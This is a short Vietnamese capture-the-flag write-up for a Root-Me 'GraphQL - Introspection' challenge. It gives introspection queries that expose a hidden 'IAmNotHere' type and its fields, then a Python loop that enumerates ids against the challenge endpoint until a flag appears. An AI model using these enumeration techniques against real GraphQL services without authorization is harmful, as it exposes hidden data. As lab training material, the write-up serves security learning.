# GraphQL - Introspection

## Solution

Attack surface của challenge là: GraphQL

Quy trình exploit:

- Xác định điểm inject bằng cách sử dụng: `{__schema{types{name}}}`. Đây là truy vấn chung về lược đồ GraphQL, sẽ tìm tên của tất cả các loại đang được sử dụng, bằng cách kiểm tra kết quả, có thể thấy, nhận được một loạt các loại, bao gồm cả "IAmNotHere" (có vẻ hứa hẹn)

- Tìm hiểu thêm về loại "IAmNotHere" bằng cách sử dụng truy vấn sau: `{__type (name: \"IAmNotHere\") {name fields{name type{name kind ofType{name kind}}}}}`. Nó có 2 trường: `very_long_id` & `very_long_value`.

- Truy vấn cuối cùng được sử dụng để tìm kiếm flag: `{ IAmNotHere(very_long_id:[i]) { very_long_id, very_long_value } }`

- Suy ra id đúng khớp với flag:

```
import requests,sys,re,json
 
proxies = {'http': '127.0.0.1:8080'}
url = "http://challenge01.root-me.org:59077/rocketql"
query = """
{
        IAmNotHere(very_long_id:[i]) {
                very_long_id, very_long_value }
}
"""
 
for i in range(1,40):
        r = requests.post(url, json={"query": query.replace("[i]", str(i))}     ,proxies = proxies)
        res = r.text
        if "flag" in res:
            print("(+) flag found!\n%s" % res)
```